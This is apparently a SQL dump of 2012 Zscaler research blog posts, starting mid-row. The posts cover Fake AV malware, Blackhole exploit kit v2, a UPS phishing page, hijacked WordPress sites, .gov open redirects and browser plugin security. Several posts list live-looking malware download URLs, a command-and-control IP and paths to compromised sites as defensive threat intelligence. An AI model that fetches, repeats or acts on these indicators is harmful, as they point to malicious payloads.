hxxp://steamsinglemonthf.net/?affid=00333&promo_type=4&promo_opt=1hxxp://domainddincowsrows.info/?affid=00333&promo_type=4&promo_opt=1 It appears that affiliate 00333 is very good at redirecting users, but we did see other IDs: 00401, 00399Fake AV in actionHere are a couple of screenshots of the Fake AV executable in action. It does actually register itself as an antivirus solution on a Windows PC. You will notice that they have not bothered updating their software as it sill shows up as XP Anti-SPyware 2011.XP Antivirus 2011 installed as a legitimate AVFake AV finds viruses in files that do not existThe malicious AV program seems to have been written by Russian hackers.Upon installation, it disable the Firewall and existing AV solutions, disables AV updates, disables security warnings and sets itself as the default AV solution. It also deletes the installer (freescan_2013.exe).It downloads and runs the file hxxp://googlesearchnaimokimbles.net/data.exe. This domain is blocked by Google Safe Browsing, but the executable is blocked by only 9 of 46 AV engines. A malicious executable, bap.exe, is added to the file system and it is registered to execute any .exe file. The same file is also used to execute Internet Explorer: Instead of running C:\\Program Files\\Internet Explorer\\iexplore.exe, it runs bap.exe -a \"C:\\Program Files\\Internet Explorer\\iexplore.exe\". It wraps any executable run by the user.The Fake AV program then connects back to 109.206.174.62. This IP hosts several suspicious domains including:avit2013.comstr321.comsupporr2013.comThese Fake AV pages are also the same as they were three years ago. They probably don\'t need to change as long as very few antivirus vendors block them and as long as users keep trusting random warnings on the Internet. Once the user is infected, the Fake AV takes over the system and it is very hard to clean up.', 'Malware', 'https://www.zscaler.com/blogs/research/fake-av-3-years-later-still-there-still-not-blocked');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (267, '2013 Security Predictions', 'Michael Sutton', 'December 21, 2012', 'Ah, my favorite time of the year – chestnuts roasting on an open fire, a brisk chill in the air and of course…predictions of all that await us in the coming year. Given my amazing historical accuracy (all archived of the blog for your enjoyment), it’s time to once again throw my hat in the ring. This year, being the coffee addictedloving lad that I am, I’m going to apply a coffee flavored risk rating, to show just how far out on a limb I’m choosing to go with each predication.\r\n \r\n\r\n\r\n	Mild – Going head to head with the dart throwing chimps\r\n\r\n\r\n\r\n	Medium – The stars will need to align, but ‘signs point to yes’\r\n\r\n\r\n\r\n	Bold – I will definitely be saying ‘I told you so’ at this time next year\r\n\r\n\r\nMild\r\n\r\n \r\n\r\nBegun, the MDM consolidation has... - News spread quickly in December 2012 when Citrix acquired Zenprise, in an effort to beef up their mobile offerings and help enterprises tackle the challenge of BYOD devices. With a magic quadrant so covered in dots that the quadrant itself is barely visible, consider this the starters pistol in what is sure to be a year of fast and furious consolidation in the MDM space. There are simply too many vendors fighting for the same dollars for natural selection not to occur. Combine that with the old guard of the security and networking industries desperate to stay relevant in a mobile future and it\'s sure to be an interesting year.\r\n\r\n \r\n\r\nBig data goes big time - Perhaps the strongest metric for a security technology reaching the \'peak of inflated expectations\' comes every spring at the RSA Conference. A quick perusal of the most common marketing slogans decorating vendor booths reveals which technologies are about to blanket airport billboards the world over. \'Cloud\' has held that lofty title for the past couple of years, but get ready for \'big data\'. A host of security companies promising to better collect, manage and summarize security data to find the security needles in a haystack are about to take center stage and you can be rest assured that the old guard will quickly repackage existing solutions to join the party.\r\n\r\nMedium\r\n\r\n \r\n\r\nDetection vs Prevention - I recently attended a talk by Art Coviello, the President and CEO of RSA Security in which he argued that the general budget spent on security solutions promising Prevention/Detection/Response capabilities is approximately an 80%/15%/5% split. I agree and it illustrates that enterprises place far too much emphasis on prevention and the approach simply isn\'t working. The unfortunate reality for enterprises is that compromised PCs and data breaches are a daily fact of life. Even a budget focused 100% on prevention will not eliminate these issues. Spending too little on detection however, will guarantee that these incidents go unnoticed and small compromises turn into catastrophic losses. Fortunately, thanks to increasing openness regarding compromises (some voluntary, some legal), enterprises will begin shifting their security budget toward detective controls.\r\n\r\n \r\n\r\nMobile privacy - vendors called to the mat - Malicious mobile apps are like the pretty blonde at the party - even though they lack substance, they get all the attention. When a keystroke logger slips through the cracks and shows up, even for a brief period in the Google Play store, it\'s front-page news. If however, an app gathers end user personally identifiable information, shares it with third parties and leaks millions of passwords, the media barely blinks an eye. The latter app scenario is however infinitely more common than the first. Truly malicious apps are relatively rare in official app stores such as Google Play and they\'re extremely rare in Apple\'s App Store. On the other hand, apps with blatant privacy concerns are extremely common. Thanks to an increasing focus by researchers on privacy concerns and projects such as ZAP, 2013 will be the year that vendors and App Store gatekeepers can no longer ignore privacy issues.\r\n\r\n \r\n\r\nHacking the \'Internet of things\' - We keep hearing about the \'Internet of things\' - connected hardware devices to ensure that our digital lifestyle is always online and always accessible, no matter where we are. From thermostats to garage door openers to security systems and appliances, traditional electronics are now Internet connected. The hardware industry unfortunately has a rather abysmal history when it comes to \'baking security in’; so expect this wave of connected hardware to present a vast amount of low hanging fruit for security researchers.\r\n\r\nBold\r\n\r\n \r\n\r\nMicrosoft finally dances with the devil - Paying for vulnerability information is no longer the moral sin that it once was. Vendors such as Mozilla and Google long ago made it an acceptable practice to reward security researchers for their hard work in uncovering vulnerabilities in their software by offering at least moderate financial rewards. Despite this trend, Microsoft has stubbornly clung to the line that they do not and will not pay for vulnerability information, despite the great benefit they receive when \'responsible disclosure\' is followed and Microsoft is provided such information for free. That said, Microsoft has continued to make slow but steady steps forward - Bluehat, security conference sponsorship, financial rewards for the capture of malware authors, etc. As Microsoft realizes the need to ensure security as a differentiator for Windows 8/RT against mobile competitors, expect this to be the year they finally break their own rule.\r\n\r\n \r\n\r\nThe privatization of malware - The malware economy continues to become increasingly specialized, with individuals and groups often focusing on a single portion of an overall attack, be it reverse engineering, exploit creation, botnet herding, etc. With the value of a 0day vulnerability in a popular program now well into the six figure range, we\'re no longer simply talking about low brow criminals dabbling in this world. White-collar researchers are parting with vulnerability information, selling it to a middleman and not asking questions about where it may end up. This trend will continue, but expect new participants to enter the fray, namely nation states. Governments, the US government included, have shown increasing comfort leveraging online attacks to achieve specific goals, such as was the case with Stuxnet, or to enhance traditional physical attacks. Nation states, desperate for top talent to stay ahead, will not confine themselves to only homegrown talent but become increasingly aggressive bidders on the open market. Unlike physical weapons whose R&D costs limit their production to governments willing to spend billions, 0day information thrives in the private market.\r\n\r\n \r\n\r\nSee you next year!\r\n\r\n \r\n\r\n- michael', 'Cloud', 'https://www.zscaler.com/blogs/research/2013-security-predictions');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (268, 'HTTPS Everywhere For Internet Explorer', 'Julien Sobrier', 'December 17, 2012', 'We have previously released a number of browser security extensions to protect users against new threats and security issues, which we did not feel were addressed by anything previously available. Now I\'ve focused my attention on a popular and useful security extension which has been missing on Internet Explorer. Internet Explorer is still the most popular browser in the enterprise, but its weak extension architecture makes it a rather difficult platform to work with. The first extension I wanted to offer to Internet Explorer users is HTTPS Everywhere from the Electronic Frontier Foundation.Download HTTPS Everywhere for Internet ExplorerHTTPS EverywhereYou can get a detailed explanation of the original extension on the EFF website. In summary, the extension forces a browser to use HTTPS (encrypted HTTP) whenever possible (e.g. when the website allows it).HTTPS Everywhere redirects users to HTTPS URLs based on a set of rules. Switching from HTTP to HTTPS is still not as easy as it should be and many domains have not designed their websites to be accessed securely. I\'ve explained some of the challenges in an earlier post.The HTTPS Everywhere rules define which domain name can be accessed over HTTPS and how URLs need to be translated. For example, http://www.google.com/ should be translated into https://encrypted.google.com/. Some sections of websites may not be available over HTTPS and the rules take care of these exceptions.Example of HTTPS Everywhere rulesHTTPS Everywhere also secures cookies according to rules, adding the secure attribute to cookies sent by the server. This ensures that any later access to the domains using HTTP (unsecure) will not leak sensitive information such as the session ID.HTTPS Everywhere for Internet ExplorerI\'m very pleased to announce the release of HTTPS Everywhere for Internet Explorer 0.0.0.1. You can download it now at https://www.zscaler.com/research/plugins/ie/https-everywhere/https-everywhere.exe.Early releaseAs the version number suggests, this is a very early release. I have been using the extension for several weeks without any problems, but it should be considered an alpha release. Version 0.0.0.1 translates URLs from HTTP to HTTPS according to the EFF rules and secures cookies. It does not currently support HSTS, not does it provide support for custom rules.RequirementsThe good news is that the extension works with pretty much all recent 32-bit versions of Internet Explorer:Windows XP SP3 to Windows 8Internet Explorer 6 to 10The extension will be available for Internet Explorer 64-bit soon. It does not work with Internet Explorer 10 Metro - see this post for more details on the Metro version). Download HTTPS Everywhere for Internet ExplorerInstall itThe extension comes with an installer. Simply download https-everywhere.exe and run it. Then make sure you restart Internet Explorer to enable the extension.HTTPS Everywhere installerDocumentationWe have a detailed documentation available on our website. It details how the extension works and describes it\'s architecture. Some of the behaviors are not obvious, so I strongly suggest that you read it. The documentation will be updated as we release new versions of HTTPS Everywhere for Internet Explorer.NextThis is a very first release of HTTPS Everywhere and there will be many more to come. The first task on my todo list is to make the source code available on the EFF website. Then I\'ll add the features missing from the Firefox and Chrome versions, including HSTS support, custom rules, etc.You can check the HTTPS Everywhere for Internet explorer page on the Zscaler website for updates.', 'Microsoft', 'https://www.zscaler.com/blogs/research/https-everywhere-internet-explorer');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (269, 'Flash In Windows 8: The Good, The Bad And The Ugly', 'Julien Sobrier', 'December 07, 2012', 'Last week I described how Chrome and Firefox are protecting users against vulnerable plugins, Flash and Java amongst them, with Click to Play. Microsoft has a different approach with Windows 8 when it comes to protecting users against attack using the Flash plugin.  Embedded Flash Player  Windows 8 ships with its own version of Flash. Users can no longer install Flash from the Adobe website. On the good side, Flash updates are now part of the overall Windows update process.    This is similar to Apple shipping their own version of Java. While it forces users to update their plugins along with the OS, we\'ve also see the downside. MacOSX was hit by malware that used a vulnerability in the older Java version shipped by Apple that had been patched months prior by Oracle.    Microsoft and Adobe have a much closer relationship than Apple and Oracle, but the Flash version shipped by Windows 8 (11.3.376.12) is already quite far behind the latest version offered by Adobe (11.5.502.110). The same problem that Apple faced with keeping up with security upgrades might already be occurring in Windows 8.       	  		  			  		  		  			Flash version number in Windows 8 at the top  		  	         Internet Explorer Desktop and Internet Explorer Metro  Windows 8 comes with two version of Internet Explorer 10: the Desktop version and the Metro Version.       	  		  			  		  		  			Internet Explorer 10 Metro  		  	        The Desktop version is pretty much the same as Internet Explorer 9 on Windows 7. Besides the embedded Flash version, Flash content is handled the same way as it is in Internet Explorer 9.    The Metro version, besides a very different UI, handles Flash very differently. Microsoft has decided to let the Flash plugin run only on a list of whitelisted websites. For all other websites, Flash is disabled. This is a more intrusive protection than Click for Play, but it also brings better protection.       	  		  			  		  		  			Flash disabled on non-whitelisted website  		  	    However, I must say this behavior is quite disconcerting to the user. There is no warning from the browser that Flash has been disabled for a given website, but not for others. Most websites, like the one above, will just say that Flash is not installed, and give a link to the official Adobe website .... which the Windows 8 user cannot use!    The only work around for webmasters to enable Flash on their website is to ask users to switch to the Desktop version of Internet Explorer. Webmaster can add an HTML tag or HTTP header to request the user to switch versions. Internet Explorer Metro shows a popup suggesting a switch to the Desktop version.    No plugin    The other plugins (Java and others) work fine on the Desktop version, but not at all on the Metro version. No warning is shown to the user. Browser extensions (BHO, Browser Helper Object) are also not working with Internet Explorer Metro.    Microsoft is taking a radical approach by forbidding plugins and extensions to run in the Metro version of Internet Explorer. We will see if users switch back to the plugin-enabled Desktop version, or if webmasters will move to HTML5 to replace their Flash and Java content.', 'Uncategorised', 'https://www.zscaler.com/blogs/research/flash-windows-8-good-bad-and-ugly');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (270, 'Click To Play: The Next Step For Firefox', 'Julien Sobrier', 'November 29, 2012', 'Click to Play first appeared in Firefox 14 and it appeared in developer versions of Chrome back in 2010. I described the feature in a post last July. Click to Play disables all plugins by default on all pages. The user then has to explicitly click on a warning to let the plugin, Flash or Java for example, run. Chrome and Firefox both have Click to Play disabled by default. After trying to use Click to Play for a week in Firefox, I had to give up, too many websites were not working and the warning was not always showing on the page.Click to Play warning in Firefox 14Firefox 17Firefox 17 is the first browser to enable Click to Play by default, with a caveat. Click to Play is enabled only for plugins that are outdated and vulnerable. It is possible to enable Click to Play for all plugins, including up to date ones, by changing the property plugins.click_to_play to true in about:config. However, it is not possible to disable the feature for vulnerable plugins.One of the problems in the previous implementation of Click to Play was that plugins could be used without any visual widget on the page, so no warning would be displayed to the user. In Firefox 17, there is an additional icon on the left of the URL bar that is visible when a plugin has been disabled on the page. You can click on the blue icon to choose what to do: enable the plugin once, always enable the plugin on the site, etc.New icon to manage disabled pluginsMore options for always disable or enable outdated plugins on a sitePlugin checkFirefox has also had tools to verify whether the plugins installed are up to date for a while. However, this is a manual process: go to Tools - Add-ons - Plugins and click on Check to see if your plugins are up to date. This opens a new tab to the Firefox website with information about the plugins installed.Information about my pluginsYou will notice that four of my plugins are unknown to Mozilla. In this case, the page cannot tell me whether they are up to date or not.Fortunately, Mozilla makes it clear when there\'s a difference between outdated versionssimply lacking new features and unsafe versions:Vulnerable Flash versionOutdated Flash versionClick to Play kicks in for vulnerable versions only, not for outdated versions of a plugin. This is better for companies that don\'t let users upgrade to the latest version (like Flash 11) but still install safe versions of older releases (Flash 9 in my example).Not full securityFirst, Mozilla cannot manage all plugins. It is not always able to tell whether a particular version is safe or not. Because Mozilla chooses to enable Click to Play for outdated and vulnerable version only, it would not have protected users against 0-day vulnerabilities, like the vulnerability that affected the latest version of the Java plugins, or the Flash 0-day exploit that circulated on the web.Strangely, the feature stopped working for me after a while. I reinstalled Firefox, wiping out all my user settings, a couple of times, but the same thing happened: after using Firefox for about one hour, Click to Play was not kicking in anymore.While it is not a silver bullet, this is a good step forward in making Firefox user safer. They have also made UI improvements since Firefox 14 that make the feature much more usable.', 'Analysis', 'https://www.zscaler.com/blogs/research/click-play-next-step-firefox');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (271, 'UPS Phishing Page With Malware', 'Julien Sobrier', 'November 16, 2012', 'For some time now, attackers have been faking popular websites like YouTube to entice users into downloading and installing malicious software disguised as plugin updates or video codecs. I rcently found a page that is using the same technique to distribute a malicious executable through a fake UPS page.The page is located at hxxp://www.retinamac.ru/UPS/. It has been up for at least three weeks and not yet blacklisted by Google Safe Browsing. At the top is a fake Firefox warning bar (the same type we analyzed earlier) for a missing plugin. It is interesting to note that the page shows the same fake bar to all browsers - it does not attempt to fake a specific implementation for say Internet Explorer or Chrome.Fake UPS websiteThe page warns of a missing plugin. All links, buttons and images open a new popup to download  JavaJREInstaller.exe. On 10/31, only 4 AV vendors were detecting the threat out of 43 vendors! Five days later, that count rose to 35 AV vendors. This illustrates how hard it is for AV to detect new threats.A behavioral analysis of the executable shows that several executables are dropped into a temporary folders:C:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\00442734.exeC:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\00445cfa.exeC:\\DOCUME~1\\ALLUSE~1\\LOCALS~1\\Temp\\msuuioeyi.exeC:\\Documents and Settings\\All Users\\Application Data\\8CAFEE7F380FD13300008CAF61D8DA37\\8CAFEE7F380FD13300008CAF61D8DA37.exeThe last executable is registered to run with every startup. This example is very representative of the threats we see on the Internet today - most of the attacker effort goes into hiding the malicious executable from the AV vendors, not into the way the payload is delivered to potential victims. This is true for many exploit kits such as the Blackhole exploit kit, where it is much easier to detect the page used to deliver the executables than the malicious executables themselves.', 'AntiVirus;Malware', 'https://www.zscaler.com/blogs/research/ups-phishing-page-malware');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (272, 'Evolution Of The \"Work From Home\" Scam', 'Julien Sobrier', 'November 08, 2012', 'The \"Work at home mum makes $X,000/month\"scam has been around forever. In fact it has been an integral part of various scam campaigns which we\'ve detailed in the past. These scams even appear in the list of the top-20,000 most visited websites in the world.It is interesting to follow the evolution of this scam. The scam site always looks like a newspaper website (NBC, News Daily, etc.) with a legitimate news article, but they keep making small \"improvements\". Earlier this year, the scammers \"borrowed\" Facebook Like buttons to make it appear as though they had many supporters.In the past two weeks, thousands of WordPress websites have been hijacked to redirect to online13workhome.com. New pages are added inside the /wp-includes/ directory:http://crewing-russia.com/wp-includes/zaoedtis.phphttp://nishikanttravels.com/images/gllsxayu.phphttp://mitra-corp.com/wp-includes/kexohywj.php http://aeflosangeles.com/wp-includes/bkpokbpc.phphttp://logintofacebook.biz/wp-includes/hjgmmvsh.phphttp://drhassanattia.com/wp-includes/zbfcbyom.phphttp://sumittirathyatra.com/images/zypeeucx.phpetc.The file names seem to be random and unique. Some of the hijacked websites are blacklisted by Google Safe Browsing, but the majority are not flagged and some of the websites have been cleaned up.\"Work from home\" scamAbove is a spoof of the CNBC website. The page is well designed, with fake ads for CNBC Pro, summaries of fake articles on the elections, etc.  They even use geo-localization to modify the title of the article to include the local city name: San Jose Mum...\", \"Atlanta Mum...\".JavaScript used for geo-localizationAll the links redirect to www.realonlineincnow.com (currently down). Neither online13workhome.com nor realonlineincnow.com are currently blacklisted by Google Safe Browsing, but some of the hijacked sites leading to them are blocked by Google.', 'Uncategorised', 'https://www.zscaler.com/blogs/research/evolution-work-home-scam');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (273, 'Enterprise Traffic Decrease In Wake Of Hurricane Sandy', 'ThreatLabz', 'October 31, 2012', 'We have received several requests inquiring as to the changes in enterprise Internet activity in the regions impacted by Hurricane Sandy.  There is no question that the hurricane impacted the US in a variety of ways.  Zscaler provides security and policy enforcement for web and email network traffic for Enterprise users, while in the office or working remotely.  Given the role that Zscaler plays, we are able to do regional traffic comparisons from enterprises from last Monday/Tuesday (\"normal\") with this Monday/Tuesday (impacted by hurricane).  Enterprise web traffic can be seen as one measure of economic productivity.    Region: Washington D.C.  Zscaler has regional nodes in and around the Washington D.C. area to service regional customers and road-warriors in the area.  The following details the transactions per hour from last week (in blue) compared with those from this week (in red):                The two blue spikes on the chart correspond to the workdays last Monday and Tuesday (beginning around 6AM and ending around 7PM local time).  The two small red humps correspond to the workday traffic observed this week during Hurricane Sandy.  It is immediately apparent that there was a significant decline in the transactions from Enterprise customers during the hurricane.  More specifically, we observed an average decline of 60.93% in transactions from the previous week.  Another view of this data can be seen in the following pie chart showing the percentage breakdown of transactions across the dates being compared.             Region: New York City / New York    As with Washington D.C., Zscaler has multiple nodes in the New York area to support regional customers and road-warriors in the area.  The following charts provide a similar comparison to that previously listed in the Washington D.C. region.  The blue line represents transactions serviced last Monday/Tuesday and the red lines from this week, impacted by Sandy.  To provide a little different illustration - we have selected two New York nodes to provide a more granular comparison of traffic across the two weeks.                           The New York node 1 had an average decrease of 58.14% from the previous week, and node 2 had an average decrease of 52.31%.         In the wake of Hurricane Sandy we observed specific regional declines in traffic from our enterprise customers.  From the specific regions / nodes analyzed here, there was an average decline of 57.13% in web transaction from last week (normal customer activity) to this week (hurricane impact).  Enterprise traffic could be seen as one measure of economic productivity.', 'Cloud', 'https://www.zscaler.com/blogs/research/enterprise-traffic-decrease-wake-hurricane-sandy');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (274, '.gov Redirections Leading To Spam: How Did We Get There?', 'Julien Sobrier', 'October 30, 2012', 'You may have seen reports of an increase in .gov websites redirecting to spam or scam sites. This issue is the same as one we reported almost two years ago. Many .gov websites have open redirections that can be exploited by spammers. The example we detailed in February 2011 is actually still online, and so is the cross-site scripting (XSS) vulnerability that we found on the same page.How did we get there?Many websites want to warn users when they are leaving their domains. In the case of a .gov website, they want to make clear that an external domain does not carry the guarantee of being an official government website. This warning is supposed to add security for ens users. Facebook also uses a warning page because links can be added by anybody and Facebook cannot guarantee the safety of those URLs.Why are these warning being exploited?Spammers want clean URLs to bypass URL fitters and spam filters. They therefore use legitimate .gov websites to bypass security features. This warning may actually make the final URL look safer to the user by implying that the final URL has been linked and vetted, by the .gov website.In the case of www.fmcsa.dot.gov (see our previous post), the user has only 10 seconds to read the warning before being redirected automatically. That\'s great for the spammer as no additional click is required to redirect the user to the spam/scam site.These websites owners think they are adding additional security, but this decision is actually putting their users at risk. The assumption that leads to the abuse of open redirections is that the  user seeing the warning has clicked on an external link on a page from  the same .gov domain. Since the content on the .gov website is controlled, the external link has to be a safe link. The website creators did not think of spammers sending users directly to the warning page.The fixThe fix is actually easy - make sure the assumption is right. This means the warning page should make sure that the redirection is legitimate - that the URL is one that has been approved.There are a couple of way of ensuring that the redirection URL has been controlled:ReferrerOne way, not the most robust option, is to check the Referrer header to ensure the user comes from the same domain. This would stop user who clicked on a link in an e-mail, and spammers who use URL shorteners like bit.ly.WhitelistAnother option is to store all 3rd-party URLs in a whitelist, and check against the list before making any redirection. This would prevent anybody from using the redirection with arbitrary URLs. The main downside to this approach is the overhead to manage this list every time an external URL is added or removed from the website.HashThe most common solution is to sign the URL. For example, replace http://www.fmcsa.dot.gov/redirect.asp?page=http://www.zscaler.com/ with http://www.fmcsa.dot.gov/redirect.asp?page=http://www.zscaler.com/&;hash=THE_HASH where THE_HASH = hash(\"http://www.zscaler.com\" + secret). The URL is hashed with a secret key to prevent its replacement by a random address. This method is used by Facebook to guarantee the authenticity requests sent by Facebook to Facebook applications, for example.The important takeaway for all webmasters is to understand that spammers will take advantage of any flaw in web applications. Be very careful with the assumptions you make.', 'Abuse;Phishing', 'https://www.zscaler.com/blogs/research/gov-redirections-leading-spam-how-did-we-get-there');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (275, 'Blackhole Exploit Kit V2 On The Rise', 'ThreatLabz', 'October 19, 2012', 'It should come as no surprise that attackers are upgrading their Blackhole exploit kits to a new and more powerful version. An update is now available, thanks to the launch of Blackhole Exploit Kit v2 and we are starting to see adoption of this latest version.         v2 is different than v1 in many ways. Numerous enhancements have been made in order to ensure that the exploit kit remains undetected in the wild.          Some of key enhancements include:       	The URL format is dynamic in nature. It does not follow a particular pattern as the version 1.0 URLs did.        	 Now executables delivered with malicious content are also protected from multiple downloads.      Heavy obfuscation of the code continues as it had in the prior version. Like the Blackhole Exploit Kit v1, v2 also continues to target the known vulnerabilities in Internet Explorer (IE), Adobe and Java. A sample of raw Blackhole exploit kit v2 can be seen from the following recent infection:      Exploit Kit URL : hxxp://anygutterking.com/links/assure_numb_engineers.php                       If you observe above screen-shots, you will note the highly obfuscated JavaScript loaded in the browser.           Deobfuscation of the code allows for easier analysis. While we leverage a proprietary tool built in house for this purpose, you can also leverage tools like Malzilla and Jsunpack or attempt to manually deobfuscate the code.         The deobfuscated code shown below is divided into two parts for better understanding.       	 Browser plugins/components detection  	The code shown in the screen-shot is used to detect the different plug-ins and ActiveX components by scanning the DOM of the browser. By identifying the versions of installed plugins/components, the exploit kit can target known vulnerabilities.            	 Attacking the vulnerabilities  	In this case, a well-known vulnerability (CVE-2006-4704) in the WMI Object Broker in Microsoft Visual Studio 2005 was targeted.  For more information about this vulnerability visit read our detailed blog post here. This vulnerability was also targeted by Blackhole v1 and other exploit kits such as the Incognitoexploit kit.            At the end of the code, we see a redirect request to “hxxp://o.casasferiasacores.net/adobe/update_flash_player.exe.This is a new addition to the exploit code released in this version. If the victim’s browser is patched and none of the vulnerabilities were exploited, then this redirection still provides one last chance for the attacker to compromise the victim’s machine. The variable “end_redirect” highlighted in above screen-shot is called in function setTimeout.  After 60 seconds, the page is redirected to the aforementioned link, which is a fake page to update Adobe Flash. This a typical example of a drive by download attack. Once redirected to this page, the user is prompted to download an .exe file labeled “update_flash_player.exe”                   Screen-shot of fake Adobe page hosted on malicious domain,                  VirusTotal reportshows that currently only 3/43 AV vendor flag this file as malicious. The ThreatExpert report for this same file came back as expected. It identified the file with the highest severity level and analysis indicators show the binary belonging to the ‘keylogger’ family.  The file also connects to the Internet and downloads additional exe files.              Screen-shot of ThreatExpert report:                  Exploits kits are becoming smarter day by day, which is keeping security vendors on their toes in an effort to combat new attacks. Fortunately, the cloud infrastructure at Zscaler allows us the flexibility to quickly add new detections as needed.                  With Blackhole Exploit Kit v1, we saw an increase in malicious domains hosting exploit kits URL’s as the kit matured over the time. With the latest version being more sophisticated, we are expecting to see an even more rapid growth of Blackhole Exploit Kit v2.          Pradeep', 'Exploit Kit', 'https://www.zscaler.com/blogs/research/blackhole-exploit-kit-v2-rise');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (276, 'Hijacked Websites By The Numbers', 'Julien Sobrier', 'October 18, 2012', 'Two weeks ago, I had the chance to give a presentation about the danger of hijacked websites (you can download the presentation in French here). I used the talk to highlight various points which illustrate the extent of the problem.    Some numbers    70% of malicious links were found on hijacked websites in 2011 (Sophos, page 39). In 2012, Google is finding 9,500 newly malicious websites every day, mostly hijacked sites (Google, 2012). The Blackhole exploit kit alone is estimated to be present on several million websites per year (AVG, weekly count).    Nikkju, a web based worm that used SQL injection to spread, has infected about 200,000 websites. Lizamoon, which started propagating in 2010, infected about 1.5 million websites via SQL injection.      High profile victims    Since the hijacking of websites is mostly automated, websites of all types are getting compromised. Here are some of the high-profile websites that have been hijacked:    	2012: French budget minister, Cleartrip (India), Computer World Mexico, and most of the top-1,000 websites blacklisted by Google like blog.com (#649), fatakat.com (#699), ziddu.com (#802)  	2011: MySQL, Geek.com, USPS, Lenovo India, etc.    The list of hijacked websites includes many governmental websites from all over the world, including the United States.    Vulnerable software    The attack surface of website is quite large, an attacker can target the CMS, its plugins, administration tools (PHPMyAdmin, Plesk, cPanel - tools which should not be publicly accessible), the web server, the FTP server, the DNS server, etc.    I looked at the number of CVEs issued in 2012 for the most popular software platforms in these areas:    	WordPress: 14 CVEs for the core, 42 for extensions, including security extensions that are supposed to make WordPress safer.  	Joomla: 7 in core  	Drupal: 20+ in core  	PHPMyAdmin: 5 - Gemenenet, a security company, was compromised through a vulnerability in PHPMyAdmin  	cPanel: 50,000 compromised through one attack  	Plesk: 1 CVE, but 50,000 websites compromised through it  	Apache: 30+ CVE (core and modules)  	BIND: 6 CVEs  	etc.    Some hosting companies were compromised as well: DreamHost (January 2012), ServerPro (February 2012), WHMCS (May 2012, provides billing and technical support to smaller hosting companies).    In your mail box    If you want some examples of hijacked websites redirecting users to malicious pages, you can take a look at your inbox. Just this morning, I received four similar messages about a fictitious payment sent to me through Intuit:    	  		  			  		  		  			Malicious e-mail  		  	    All the links and buttons point to the same URL on a hijacked site:      	www.eyslerimaging.com/blog/wp-content/plugins/flickr-widget/iprprocsd.html (photography blog)  	www.odiseya.net/wp-content/themes/twentyten/bewpinfr.html  	user3.inet.vn/wp-content/plugins/iprprocsd.html    These pages redirect to the same malicious page hxxp://navisiteseparation.net/detects/processing-details_requested.php. This page runs a malicious Java Applet. Unfortunately, I could not retrieve the content a second time for further analysis.    This is just one of the many spam campaigns that lead visitors to a malicious site.', 'Compromise', 'https://www.zscaler.com/blogs/research/hijacked-websites-numbers');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (277, 'Introducing ZAP', 'Michael Sutton', 'October 08, 2012', 'Access ZAP - http://zap.zscaler.com    View a video walkthrough for ZAP         	  		  			  		  		  			ZAP Home Page  		  	    After many months of hard work by the ThreatLabZ Team, I\'m very pleased to unveil ZAP (Zscaler Application Profiler). ZAP makes it easy for anyone to determine the risk posed by a given mobile application. Users can do this by either looking up past results, or more importantly, proactively scan any iOS/Android app.    Why did we build ZAP? Being a inline security solution inspecting web traffic, it\'s imperative that we\'re able to not only analyze traditional web traffic, but also web traffic sent by mobile applications. While we think of mobile apps as native software, in many ways they behave like custom web browsers, leveraging HTTP(S) for communication. We therefore started building ZAP as an internal resource to analyze mobile app traffic, but quickly realized that people are all too trusting of mobile apps downloaded from an \'official\' app store. Leveraging ZAP, our research has shown that apps commonly expose privacy and security risks from sending passwords in clear text to sharing personally identifiable information (PII) with third parties and that\'s why we\'re also releasing a public version of ZAP - to empower people to see this for themselves.  Search  The easiest way to leverage ZAP is to search through the historical results. Simply by typing the name of a mobile application in the search field, you can see if it has previously been analyzed. To further refine your search, you can additionally include the OS name (iOS or Android).       	  		  			  		  		  			Sample ZAP Search Results  		  	    In the sample results above, you\'ll note that the application receives an overall score out of 100 with high numbers representing a greater security/privacy risk. Detail is also provided on the following four categories which influence the overall score:       	Authentication - Username/password information sent in clear text or using weak encoding methods  	Device Metadata Leakage - Transmission of device information such as the UDID (Unique Device Identifier), MAC address or details about the operating system  	PII Leakage - Sharing personally identifiable information such as phone numbers, email addresses, mailing addresses, etc.  	Exposed content - Communication with third parties such as advertisers and analytic firms      Scan  The true power of ZAP comes from it\'s ability to empower anyone to capture and analyze the web traffic from a mobile application. In order to accomplish this, we leveraged an excellent web proxy known as mitmproxy, built a front end to interface with it and created engines to automatically analyze the captured traffic to hilight security/privacy issues.    Scanning an application is as simple as pointing your phone to ZAP and using the application that you want to analyze - that\'s it. View the video below for a detailed walkthrough of the scanning functionality, but overall, it\'s a simple six step process as noted in the image below.         Video  The video below provides a detailed walkthrough of all ZAP functionality.            We look forward to hearing your feedback on how we can continue to improve ZAP, so please take it for a test drive and let us know what you think. There are many mobile apps that expose users to security/privacy risks and to date, the app store gatekeepers aren\'t doing an adequate job of protecting end users from these threats. Using ZAP you can help analyze the ever growing list of mobile apps and reveal those that are putting users at risk.    Enjoy!    - michael', 'Analysis;Data Breach;Mobile Malware', 'https://www.zscaler.com/blogs/research/introducing-zap');
